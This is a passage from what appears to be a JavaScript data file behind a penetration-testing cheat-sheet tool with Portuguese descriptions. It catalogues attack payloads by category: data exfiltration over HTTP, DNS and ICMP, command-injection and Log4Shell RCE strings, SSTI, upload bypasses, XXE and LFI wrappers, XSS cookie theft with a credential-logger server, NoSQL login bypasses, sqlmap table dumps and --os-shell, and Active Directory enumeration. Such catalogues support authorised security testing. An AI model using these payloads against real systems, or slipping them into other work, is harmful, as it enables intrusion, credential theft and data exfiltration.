      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "systeminfo",
      showUrl: false,
      keywords: "windows systeminfo os architecture enum"
    },
    {
      id: "win-computersystem",
      title: "Windows - ComputerSystem WMI",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "Get-WmiObject Win32_ComputerSystem",
      showUrl: false,
      keywords: "windows wmi powershell enum"
    },
    {
      id: "win-domain",
      title: "Windows - Domain & Computer Name",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "echo \"$env:COMPUTERNAME,$env:USERDNSDOMAIN\"",
      showUrl: false,
      keywords: "windows domain host computer user active directory"
    },
    {
      id: "win-hotfix",
      title: "Windows - Hotfix Security Updates",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "Get-HotFix -description \"Security update\"",
      showUrl: false,
      keywords: "windows hotfix patch security update privesc"
    },
    {
      id: "win-wmic-qfe",
      title: "Windows - WMIC QFE",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "wmic qfe get HotfixID,InstalledOn",
      showUrl: false,
      keywords: "windows wmic qfe hotfix patch"
    },
    {
      id: "win-whoami-priv",
      title: "Windows - Privileges (whoami /priv)",
      category: "win",
      categoryLabel: "Windows",
      icon: "\udb80\udf72",
      subcat: "enum",
      context: "Windows Post-Exploitation",
      purpose: "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais",
      description: "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.",
      code: "whoami /priv",
      showUrl: false,
      keywords: "windows whoami priv privileges token impersonate"
    },
    {
      id: "transf-http-server",
      title: "Transfer - HTTP Server (Attacker)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferServer(port),
      showUrl: false,
      keywords: "transfer http server python attacker download host"
    },
    {
      id: "transf-wget",
      title: "Transfer - Wget (Victim)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferWget(ip, port, file),
      showUrl: false,
      keywords: "transfer wget download victim file http"
    },
    {
      id: "transf-curl",
      title: "Transfer - Curl (Victim)",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferCurl(ip, port, file),
      showUrl: false,
      keywords: "transfer curl download victim file http"
    },
    {
      id: "transf-bash-upload",
      title: "Transfer - Bash /dev/tcp Upload",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferBashUpload(ip, port, file),
      showUrl: false,
      keywords: "transfer bash dev tcp upload victim file"
    },
    {
      id: "transf-nc-listen",
      title: "Transfer - Netcat Listen",
      category: "transf",
      categoryLabel: "Transfer",
      icon: "\udb80\uddda",
      subcat: "transfer",
      context: "File Transfer",
      purpose: "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio",
      description: "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.",
      code: transferNcListen(port),
      showUrl: false,
      keywords: "transfer netcat nc listen receive data file"
    },
    {
      id: "exfil-curl-file",
      title: "Exfil - curl POST arquivo",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilCurlFile(ip, port, file),
      showUrl: false,
      keywords: "exfil exfiltracao curl post file data binary"
    },
    {
      id: "exfil-wget-post",
      title: "Exfil - wget --post-file",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilWgetPost(ip, port, file),
      showUrl: false,
      keywords: "exfil wget post file upload"
    },
    {
      id: "exfil-nc-file",
      title: "Exfil - nc < arquivo",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilNcFile(ip, port, file),
      showUrl: false,
      keywords: "exfil netcat nc file redirect"
    },
    {
      id: "exfil-tar-nc",
      title: "Exfil - tar + nc (diretorio)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilTarNc(ip, port),
      showUrl: false,
      keywords: "exfil tar gzip nc directory compress"
    },
    {
      id: "exfil-b64-chunk",
      title: "Exfil - base64 fatiado via curl",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilB64Chunk(ip, port, file),
      showUrl: false,
      keywords: "exfil base64 chunk fold curl blind post"
    },
    {
      id: "exfil-python-http",
      title: "Exfil - Python requests POST",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilPythonHttp(ip, port, file),
      showUrl: false,
      keywords: "exfil python requests post upload http"
    },
    {
      id: "exfil-dns",
      title: "Exfil - DNS (dig por label)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilDns(file),
      showUrl: false,
      keywords: "exfil dns dig base64 label covert blind"
    },
    {
      id: "exfil-nslookup",
      title: "Exfil - DNS via nslookup/certutil (Win)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilNslookup(file),
      showUrl: false,
      keywords: "exfil dns nslookup windows certutil blind"
    },
    {
      id: "exfil-ping",
      title: "Exfil - ICMP ping -p (hex)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilPing(file),
      showUrl: false,
      keywords: "exfil icmp ping hex covert blind xxd"
    },
    {
      id: "exfil-ps-iwr",
      title: "Exfil - PowerShell Invoke-WebRequest",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilPowershellFile(ip, port, file),
      showUrl: false,
      keywords: "exfil powershell invoke-webrequest iwr windows upload"
    },
    {
      id: "exfil-ps-b64",
      title: "Exfil - PowerShell base64 via GET",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilPowershellB64(ip, file),
      showUrl: true,
      keywords: "exfil powershell base64 get query cookie blind windows"
    },
    {
      id: "exfil-certutil",
      title: "Exfil - certutil -encode (Win)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilCertutilEncode(file),
      showUrl: false,
      keywords: "exfil certutil encode base64 windows"
    },
    {
      id: "exfil-metadata",
      title: "Exfil - Cloud metadata (SSRF)",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: exfilCurlMetadata(),
      showUrl: true,
      keywords: "exfil ssrf cloud metadata aws 169.254.169.254"
    },
    {
      id: "rce-semicolon",
      title: "RCE - separador ;",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceSemicolon("id"),
      showUrl: true,
      keywords: "rce command injection semicolon linux separator"
    },
    {
      id: "rce-pipe",
      title: "RCE - pipe |",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rcePipe("id"),
      showUrl: true,
      keywords: "rce command injection pipe linux"
    },
    {
      id: "rce-and",
      title: "RCE - && encadeado",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceAnd("id"),
      showUrl: true,
      keywords: "rce command injection and operator linux"
    },
    {
      id: "rce-or",
      title: "RCE - || fallback",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceOr("id"),
      showUrl: true,
      keywords: "rce command injection or operator linux"
    },
    {
      id: "rce-subshell",
      title: "RCE - subshell $()",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceSubshell("id"),
      showUrl: true,
      keywords: "rce command injection subshell dolar parenthesis"
    },
    {
      id: "rce-backtick",
      title: "RCE - backticks",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceBacktick("id"),
      showUrl: true,
      keywords: "rce command injection backtick linux"
    },
    {
      id: "rce-newline",
      title: "RCE - quebra de linha %0a",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceNewline("id"),
      showUrl: true,
      keywords: "rce command injection newline encoded bypass"
    },
    {
      id: "rce-ifs",
      title: "RCE - bypass de espaco ${IFS}",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: "cat${IFS}/etc/passwd",
      showUrl: true,
      keywords: "rce command injection ifs space bypass filter waf"
    },
    {
      id: "rce-b64",
      title: "RCE - wrapper base64 echo|bash",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceB64Wrapper("id"),
      showUrl: true,
      keywords: "rce base64 wrapper bypass filter waf encode"
    },
    {
      id: "rce-php-system",
      title: "RCE - PHP system($_GET)",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rcePhpSystem(),
      showUrl: true,
      keywords: "rce php system get web injection"
    },
    {
      id: "rce-php-passthru",
      title: "RCE - PHP passthru quebra de string",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rcePhpPassthru(),
      showUrl: true,
      keywords: "rce php passthru injection web"
    },
    {
      id: "rce-win-amp",
      title: "RCE - Windows &",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceWinAmp("whoami"),
      showUrl: true,
      keywords: "rce windows cmd amp injection"
    },
    {
      id: "rce-ssti-detect",
      title: "RCE - SSTI deteccao {{7*7}}",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceSstiDetect(),
      showUrl: true,
      keywords: "rce ssti jinja detection template injection 7x7"
    },
    {
      id: "rce-ssti-jinja",
      title: "RCE - SSTI Jinja2 os.popen",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceSstiJinja(),
      showUrl: true,
      keywords: "rce ssti jinja2 python os popen template"
    },
    {
      id: "rce-ssti-bypass",
      title: "RCE - SSTI Jinja2 via cycler",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceSstiJinjaBypass(),
      showUrl: true,
      keywords: "rce ssti jinja2 bypass cycler filter template"
    },
    {
      id: "rce-log4j",
      title: "RCE - Log4Shell JNDI",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceLog4j(ip, port),
      showUrl: true,
      keywords: "rce log4j log4shell jndi ldap java"
    },
    {
      id: "rce-log4j-bypass",
      title: "RCE - Log4Shell bypass ${::-j}",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: rceLog4jBypass(ip, port),
      showUrl: true,
      keywords: "rce log4j bypass waf lookup java"
    },
    {
      id: "upload-htaccess",
      title: "Upload bypass - .htaccess",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: uploadHtaccess(),
      showUrl: false,
      keywords: "upload bypass htaccess apache php jpg rce"
    },
    {
      id: "upload-userini",
      title: "Upload bypass - .user.ini",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: uploadUserIni(),
      showUrl: false,
      keywords: "upload bypass user.ini prepend php rce"
    },
    {
      id: "upload-double-ext",
      title: "Upload bypass - extensoes",
      category: "rce",
      categoryLabel: "RCE",
      icon: "\udb82\udfc2",
      subcat: "rce",
      context: "Remote Code Execution (RCE)",
      purpose: "Executar comandos em endpoint vulner\u00e1vel",
      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
      code: uploadDoubleExt(),
      showUrl: false,
      keywords: "upload bypass extension double phtml php5 phar rce"
    },
    {
      id: "ssrf-cloud",
      title: "SSRF - Cloud metadata",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: ssrfCloud(),
      showUrl: true,
      keywords: "ssrf cloud metadata aws blind request forgery"
    },
    {
      id: "xxe-file",
      title: "XXE - leitura /etc/passwd",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: xxeFile(),
      showUrl: false,
      keywords: "xxe xml entity file read etc passwd"
    },
    {
      id: "xxe-oob",
      title: "XXE - OOB via DTD externa",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: xxeOob(ip, port),
      showUrl: false,
      keywords: "xxe oob dtd external blind out of band"
    },
    {
      id: "lfi-proc",
      title: "LFI - /proc/self/environ",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiProcEnviron(),
      showUrl: true,
      keywords: "lfi proc environ poison rce local file"
    },
    {
      id: "lfi-data",
      title: "LFI - wrapper data:// RCE",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiDataWrapper(),
      showUrl: true,
      keywords: "lfi data wrapper php rce"
    },
    {
      id: "lfi-expect",
      title: "LFI - wrapper expect://",
      category: "lfi",
      categoryLabel: "LFI",
      icon: "\udb80\ude14",
      subcat: "lfi",
      context: "Local File Inclusion",
      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
      code: lfiExpectWrapper(),
      showUrl: true,
      keywords: "lfi expect wrapper command rce php"
    },
    {
      id: "xss-cookie-steal",
      title: "XSS - roubo de cookie via IMG",
      category: "xss",
      categoryLabel: "XSS",
      icon: "\udb80\udd69",
      subcat: "xss",
      context: "Cross-Site Scripting",
      purpose: "Testar reflex\u00e3o de script no cliente",
      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
      code: credCaptureXss(ip, port),
      showUrl: true,
      keywords: "xss cookie steal session image exfil credential"
    },
    {
      id: "cred-logger",
      title: "Cred capture - servidor logger Python",
      category: "exfil",
      categoryLabel: "Exfil",
      icon: "\udb80\ude0e",
      subcat: "exfil",
      context: "Data Exfiltration Test",
      purpose: "Simular sa\u00edda de dados por canais alternativos",
      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
      code: credLoggerServer(port),
      showUrl: false,
      keywords: "credential logger http server cookie capture xss exfil"
    },
    {
      id: "nosql-ne",
      title: "NoSQLi - $ne bypass login",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
      showUrl: true,
      keywords: "nosql mongo ne bypass injection login"
    },
    {
      id: "nosql-gt",
      title: "NoSQLi - $gt bypass",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
      showUrl: true,
      keywords: "nosql mongo gt bypass injection"
    },
    {
      id: "sqlmap-dbs",
      title: "sqlmap - enumerar bancos",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "sqlmap -u 'http://TARGET/page?id=1' --batch --dbs",
      showUrl: false,
      keywords: "sqlmap dump dbs automate sqli"
    },
    {
      id: "sqlmap-dump",
      title: "sqlmap - dump tabela users",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "sqlmap -u 'http://TARGET/page?id=1' --batch -D db -T users --dump",
      showUrl: false,
      keywords: "sqlmap dump table users automate sqli"
    },
    {
      id: "sqlmap-osshell",
      title: "sqlmap - --os-shell",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "general",
      context: "SQL Injection",
      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
      code: "sqlmap -r req.txt --batch --os-shell",
      showUrl: false,
      keywords: "sqlmap os-shell rce automate sqli"
    },
    {
      id: "ad-srv",
      title: "AD - descobrir DC via DNS SRV",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adNslookupSrv(domain),
      showUrl: false,
      keywords: "ad active directory domain dns srv ldap dc discover enum"
    },
    {
      id: "ad-enum4linux",
      title: "AD - enum4linux-ng tudo",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adEnum4linux(dc),
      showUrl: false,
      keywords: "ad enum4linux smb null session enum users shares"
    },
    {
      id: "ad-nxc-null",
      title: "AD - NetExec SMB sessao nula",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adNxcSmbNull(dc, domain),
      showUrl: false,
      keywords: "ad netexec nxc crackmapexec smb null shares enum"
    },
    {
      id: "ad-nxc-auth",
      title: "AD - NetExec SMB users/grupos/politica",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adNxcUsers(dc, domain, user, "PASS"),
      showUrl: false,
      keywords: "ad netexec nxc smb users groups pass-pol enum authenticated"
    },
    {
      id: "ad-rpc-null",
      title: "AD - rpcclient enumdomusers",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adRpcNull(dc),
      showUrl: false,
      keywords: "ad rpcclient rpc null enum users"
    },
    {
      id: "ad-ldap-base",
      title: "AD - ldapsearch namingcontexts",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adLdapBase(dc),
      showUrl: false,
      keywords: "ad ldap ldapsearch base namingcontexts enum"
    },
    {
      id: "ad-ldap-users",
      title: "AD - ldapsearch usuarios+membership",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
      code: adLdapUsers(dc, domain),
      showUrl: false,
      keywords: "ad ldap ldapsearch users samaccountname memberof enum"
    },
    {
      id: "ad-bloodhound-py",
      title: "AD - BloodHound collector (Linux)",
      category: "ad",
      categoryLabel: "AD",
      icon: "\udb80\udc02",
      subcat: "ad",
      context: "Active Directory Domain",
